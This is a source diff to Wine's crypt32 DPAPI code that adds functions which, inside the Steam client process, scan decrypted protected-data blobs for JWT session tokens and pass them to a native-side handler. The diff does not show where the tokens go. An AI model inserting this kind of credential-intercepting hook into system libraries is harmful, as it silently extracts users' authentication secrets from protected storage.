diff --git a/dlls/crypt32/protectdata.c b/dlls/crypt32/protectdata.c
--- a/dlls/crypt32/protectdata.c
+++ b/dlls/crypt32/protectdata.c
@@ -42,9 +42,132 @@
 #include "windef.h"
 #include "winbase.h"
 #include "wincrypt.h"
+#include "crypt32_private.h"
 #include "wine/debug.h"

 WINE_DEFAULT_DEBUG_CHANNEL(crypt);
+
+
+/* Only the user's interactive Steam client participates. Do not export
+ * generic DPAPI data, a browser, another installed Steam or any password. */
+static unsigned int mdeck_steam_scope(void)
+{
+    WCHAR path[MAX_PATH];
+    const WCHAR *name = path;
+    DWORD old_error = GetLastError();
+    DWORD n = GetModuleFileNameW( NULL, path, ARRAY_SIZE(path) ), i;
+    unsigned int scope = MDECK_STEAM_SCOPE_UNKNOWN;
+    if (n && n < ARRAY_SIZE(path))
+    {
+        if (!lstrcmpiW( path, L"C:\\Program Files\\Steam Client\\Steam.exe" ))
+            scope = MDECK_STEAM_SCOPE_INTERACTIVE;
+        else
+        {
+            for (i = 0; i < n; i++) if (path[i] == '\\' || path[i] == '/') name = path + i + 1;
+            if (!lstrcmpiW( name, L"steam.exe" )) scope = MDECK_STEAM_SCOPE_OTHER_STEAM;
+            else if (!lstrcmpiW( name, L"steamwebhelper.exe" )) scope = MDECK_STEAM_SCOPE_WEBHELPER;
+            else scope = MDECK_STEAM_SCOPE_OTHER;
+        }
+    }
+    SetLastError( old_error );
+    return scope;
+}
+
+static BOOL mdeck_steam_process(void)
+{
+    return mdeck_steam_scope() == MDECK_STEAM_SCOPE_INTERACTIVE;
+}
+
+static void mdeck_steam_event( unsigned int event )
+{
+    static LONG reported;
+    struct mdeck_steam_token_params params = { NULL, event };
+    DWORD old_error = GetLastError();
+    LONG bit;
+    if (event < MDECK_STEAM_MONITOR_ATTACHED || event > MDECK_STEAM_EVENT_LAST) return;
+    bit = 1 << (event - 1);
+    if (!(InterlockedOr( &reported, bit ) & bit)) CRYPT32_CALL( mdeck_steam_token, &params );
+    SetLastError( old_error );
+}
+
+void mdeck_steam_auth_probe(void)
+{
+    mdeck_steam_event( MDECK_STEAM_MONITOR_ATTACHED );
+    mdeck_steam_event( mdeck_steam_scope() );
+}
+
+static BYTE mdeck_jwt_char( const BYTE *p, unsigned int available, unsigned int step )
+{
+    if (available < step || (step == 2 && p[1])) return 0;
+    return p[0];
+}
+
+static BOOL mdeck_jwt_base64( BYTE c )
+{
+    return (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') ||
+           (c >= '0' && c <= '9') || c == '_' || c == '-';
+}
+
+/* A complete three-segment base64url span, never a truncated prefix. */
+static unsigned int mdeck_jwt_span( const BYTE *p, unsigned int size, unsigned int step )
+{
+    unsigned int end = 0, chars = 0, segment = 0, dots = 0;
+    while (size - end >= step)
+    {
+        BYTE c = mdeck_jwt_char( p + end, size - end, step );
+        if (mdeck_jwt_base64(c)) segment++;
+        else if (c == '.')
+        {
+            if (!segment || ++dots > 2) return 0;
+            segment = 0;
+        }
+        else break;
+        if (++chars > 8192) return 0;
+        end += step;
+    }
+    /* An incomplete UTF-16 code unit may still belong to this token. */
+    if (step == 2 && size - end == 1 && (mdeck_jwt_base64(p[end]) || p[end] == '.')) return 0;
+    return chars >= 128 && dots == 2 && segment ? end : 0;
+}
+
+static void mdeck_publish_token( const DATA_BLOB *blob )
+{
+    struct mdeck_steam_token_params params;
+    unsigned int i, step, size, exported = 0;
+    DWORD old_error = GetLastError();
+    const BYTE *p;
+    if (!mdeck_steam_process()) return;
+    /* Only scan this successful Steam DPAPI payload, at most 64 KiB. */
+    if (!blob || !blob->pbData || blob->cbData < 128 || blob->cbData > 65536)
+    {
+        mdeck_steam_event( MDECK_STEAM_BLOB_SKIPPED );
+        return;
+    }
+    p = blob->pbData;
+    for (i = 0; i + 3 <= blob->cbData && exported < 4; i++)
+    {
+        if (p[i] != 'e') continue;
+        if (p[i + 1] == 'y' && p[i + 2] == 'J') step = 1;
+        else if (i + 6 <= blob->cbData && !p[i + 1] && p[i + 2] == 'y' &&
+                 !p[i + 3] && p[i + 4] == 'J' && !p[i + 5]) step = 2;
+        else continue;
+        if (i >= step)
+        {
+            BYTE previous = mdeck_jwt_char( p + i - step, step, step );
+            if (mdeck_jwt_base64(previous) || previous == '.') continue;
+        }
+        if (!(size = mdeck_jwt_span( p + i, blob->cbData - i, step ))) continue;
+        /* Transfer the JWT slice alone; wrappers and unrelated bytes stay here.
+         * Native code checks claims/account binding, then Valve verifies it. */
+        params.data = p + i;
+        params.size = size;
+        CRYPT32_CALL( mdeck_steam_token, &params );
+        exported++;
+        i += size - 1;
+    }
+    if (!exported) mdeck_steam_event( MDECK_STEAM_NO_JWT );
+    SetLastError( old_error );
+}

